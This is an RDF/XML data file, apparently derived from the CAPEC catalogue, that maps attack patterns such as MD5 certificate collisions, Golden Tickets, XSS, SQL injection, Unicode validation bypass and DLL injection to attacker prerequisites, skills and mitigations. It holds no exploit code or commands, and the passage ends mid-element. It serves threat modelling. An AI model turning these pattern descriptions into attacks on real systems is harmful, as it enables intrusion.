  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker89">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#459"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack89"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::327::295::290::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Certification Authority is using the MD5 hash function to generate the certificate hash to be signed::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Understanding of how to force an MD5 hash collision in X.509 certificates:LEVEL:High::SKILL:An attacker must be able to craft two X.509 certificates that produce the same MD5 hash:LEVEL:High::SKILL:Knowledge needed to set up a certification authority:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure cryptographic elements have been sufficiently tested for weaknesses.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack311"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.::Implementation: Provide for network flow control and traffic shaping to control access to the resources.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack273"/>
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack141"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Reset the built-in KRBTGT account password twice to invalidate the existence of any current Golden Tickets and any tickets derived from them.::Monitor system and domain logs for abnormal access.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack201"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker307">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#165"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack307"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must use the affected file without verifying its integrity.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. In some cases  tools can be used to better control the response of the targeted application to the modified file.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type  character  and encoding enforcement::Design: Server side developers should not proxy content via XHR or other means  if a http proxy for remote content is setup on the server side  the client&apos;s browser has no way of discerning where the data is originating from.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Session tokens for specific host::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser  web servers  and plug in technologies  staying current on patch release that deal with XSS countermeasures mitigates this.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack103"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Properly encrypt and sign identity tokens in transit  and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout  terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack498"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker306">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#438"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack306"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker439">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#206"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack439"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::732::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted developer must use a signing key to sign code bundles. (Note that not doing this is not a defense - it only means that the attacker does not need to steal the signing key before forging code bundles in the developer&apos;s name.)::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process  if bad character are left after decoding process  treat the data as suspicious  and fail the validation process. Refer to the RFCs to safely decode URL.::When client input is required from web-based forms  avoid using the GET method to submit data  as the method causes the form data to be appended to the URL and is easily manipulated. Instead  use the POST method whenever possible.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx)::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)::Test your path decoding process against malicious input.::In the case of path traversals  use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.::Assume all input is malicious. Create a white list that defines all valid input to the application based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack467"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker305">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#50"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack305"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::522::640::718::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The system allows users to recover their passwords and gain access back into the system.::Password recovery mechanism has been designed or implemented insecurely.::Password recovery mechanism relies only on something the user knows and not something the user has.::No third party intervention is required to use the password recovery mechanism.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Brute force attack:LEVEL:Low::SKILL:Social engineering and more sophisticated technical attacks.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::For a brute force attack one would need a machine with sufficient CPU  RAM and HD.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker438">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#13"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack438"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::353::285::302::74::15::73::20::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An environment variable is accessible to the user.::An environment variable used by the application can be tainted with user supplied data.::Input data used in an environment variable is not validated properly.::The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an attacker may attempt to manipulate that variable.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:In a web based scenario  the client controls the data that it submitted to the server. So anybody can try to send malicious data and try to bypass the authentication mechanism.:LEVEL:Low::SKILL:Some more advanced attacks may require knowledge about protocols and probing technique which help controlling a variable. The malicious user may try to understand the authentication mechanism in order to defeat it.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of an attack  an organization can create rule based filters to silently drop connections if too many are attempted in a certain time period.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack138"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker10">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#581"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack10"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Usage: Users should always explicitly log out from the social networking sites when done using them. Usage: Users should not open other tabs in the browser when using a social networking site.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack270"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker437">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#245"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack437"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::85::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted web application does not fully normalize input before checking for prohibited syntax. In particular  it must fail to recognize prohibited methods preceded by certain sequences of repeated characters.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::The attacker must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker304">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#71">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Using Unicode Encoding to Bypass Validation Logic"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack304">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#71"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::176::171::179::180::173::172::184::183::74::20::697::692::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the application for user-controllable inputs) Using a browser or an automated tool  an attacker follows all public links and actions on a web site. He records all the links  the forms  the resources accessed and all other potential entry-points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers&apos; plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Probe entry points to locate vulnerabilities) The attacker uses the entry points gathered in the Explore phase as a target list and injects various Unicode encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Try to use Unicode encoding of content in Scripts in order to bypass validation routines.:TECHNIQUE:Try to use Unicode encoding of content in HTML in order to bypass validation routines.:TECHNIQUE:Try to use Unicode encoding of content in CSS in order to bypass validation routines.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::176::171::179::180::173::172::184::183::74::20::697::692::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Filtering is performed on data that has not be properly canonicalized.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker needs to understand Unicode encodings and have an idea (or be able to find out) what system components may not be Unicode aware.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Remember to understand how to use the data access methods generated by the ORM tool / framework properly in a way that would leverage the built-in security mechanisms of the framework::Ensure to keep up to date with security relevant updates to the persistence framework used within your application.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack286"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Create a strong password policy and ensure that your system enforces this policy.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack337"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker12">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#543"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack12"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::None::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker11">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#646"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack11"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary needs either physical or remote access to the victim system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary needs to be able to infect the victim system in a manner that gives him remote access.:LEVEL:Medium::SKILL:If analyzing the Windows registry  the adversary must understand the registry structure to know where to look for devices.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker309">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#110"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack309"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::89::20::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::SOAP messages are used as a communication mechanism in the system::SOAP parameters are not properly validated at the service provider::The service provider does not properly utilize parameter binding when building SQL queries::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:If the attacker is able to gain good understanding of the system&apos;s database schema:LEVEL:Medium::SKILL:If the attacker has to perform SQL injection blindly:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker14">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#563"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack14"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Configure the access control correctly.::Design: Enforce principle of least privilege.::Design: Execute programs with constrained privileges  so parent process does not open up further vulnerabilities. Ensure that all directories  temporary directories and files  and memory are executing with limited privileges to protect against remote execution.::Design: Input validation. Assume that user inputs are malicious. Utilize strict type  character  and encoding enforcement.::Design: Proxy communication to host  so that communications are terminated at the proxy  sanitizing the requests before forwarding to server host.::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Host integrity monitoring for critical files  directories  and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.::Implementation: Perform input validation for all remote content  including remote and user-generated content.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories  programs  and interfaces that grant direct access to executables.::Implementation: Use indirect references rather than actual file names.::Implementation: Use possible permissions on file access when developing and deploying web applications.::Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack208"/>
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack196"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Minimize error/response output to only what is necessary for functional use or corrective language.::Remove potentially sensitive information that is not necessary for the application&apos;s functionality.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack24"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker308">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#274"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack308"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::302::654::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted system must attempt to filter access based on the HTTP verb used in requests.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker requires a tool that allows them to manually control the HTTP verb used to send messages to the targeted server.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker13">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#529"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack13"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have internal  logical access to the target network and system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary must be able to obtain or develop  as well as place malicious software inside the target network/system.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker16">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#503">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:122::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#WebView Exposure"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack16">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#503"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This type of an attack requires the adversary to convince the user to load the malicious web page inside the target application. Once loaded  the malicious web page will have the same permissions as the target application and will have access to all registered interfaces. Both the permission and the interface must be in place for the functionality to be exposed.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker129">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#216"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack129"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The target application must leverage an open communications channel.::The channel on which the target communicates must be vulnerable to interception (e.g.  man in the middle attack).::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A tool that is capable of viewing network traffic and generating custom inputs to be used in the attack.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Authenticating both services and their discovery  and protecting that authentication mechanism simply fixes the bulk of this problem. Protecting the authentication involves the standard means  including: 1) protecting the channel over which authentication occurs  2) preventing the theft  forgery  or prediction of authentication credentials or the resultant tokens  or 3) subversion of password reset and the like.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack161"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure virtualization software is current and up-to-date.::Abide by the least privilege principle to avoid assigning users more privileges than necessary.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack105"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker432">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#26"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack432"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::368::363::366::370::362::662::689::667::665::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A resource is accessed/modified concurrently by multiple processes such that a race condition exists.::The adversary has the ability to modify the resource.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Being able to run the race requires basic knowledge of concurrent processing including synchonization techniques.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker15">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#54"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack15"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::209::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This class of attacks does not strictly require authorized access to the application. As Attackers use this attack process to classify  map  and identify vulnerable aspects of an application  it simply requires hypotheses to be verified  interaction with the application  and time to conduct trial-and-error activities.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Although fuzzing parameters is not difficult  and often possible with automated fuzzers  interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform  the languages and packages used as well as software design.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The Attacker needs the ability to probe application functionality and provide it erroneous directives or data without triggering intrusion detection schemes or making enough of an impact on application logging that steps are taken against the attacker. The Attack does not need special hardware  software  skills  or access.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker128">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#248"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack128"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::77::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must accept input from the user and then use this input in the construction of commands to be executed. In virtually all cases  this is some form of string input that is concatenated to a constant string defined by the application to form the full command to be executed.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Enforce strict schema validation. The schema should enforce a maximum number of array elements. If the number of maximum array elements can&apos;t be limited another validation method should be used. One such method could be comparing the declared number of items in the array with the existing number of elements of the array. If these numbers don&apos;t match drop the SOAP packet at the web service layer.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack144"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker431">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#640"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack431"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted application fails to verify the integrity of the running process that allows an adversary to execute arbitrary code.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Knowledge of how to load malicious code into the memory space of a running process  as well as the ability to have the running process execute this code. For example  with DLL injection  the adversary must know how to load a DLL into the memory space of another running process  and cause this process to execute the code inside of the DLL.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker18">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#500"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack18"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An adversary must be able install a purpose built malicious application onto the device and convince the user to execute it. The malicious application is designed to target a specific web application and is used to load the target web pages via the WebView component. For example  an adversary may develop an application that interacts with Facebook via WebView and adds a new feature that a user desires. The user would install this 3rd party app instead of the Facebook app.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker127">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#457"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack127"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Some level of physical access to the device being attacked.::Information pertaining to the target organization on how to best execute a USB Drop Attack.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker430">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#428"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack430"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered  it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.::Although less reliable  the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for  in the current context.::Additionally  the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way  even if the attacker manages to get the user to click on a malicious link and request the desired action  the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.::In general  every request must be checked for the appropriate authentication token as well as authorization in the current session context.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack233"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker17">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#506"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack17"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::1021::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This pattern of attack requires the ability to execute a malicious application on the user&apos;s device. This malicious application is used to present the interface to the user and make the attack possible.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker259">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#141">
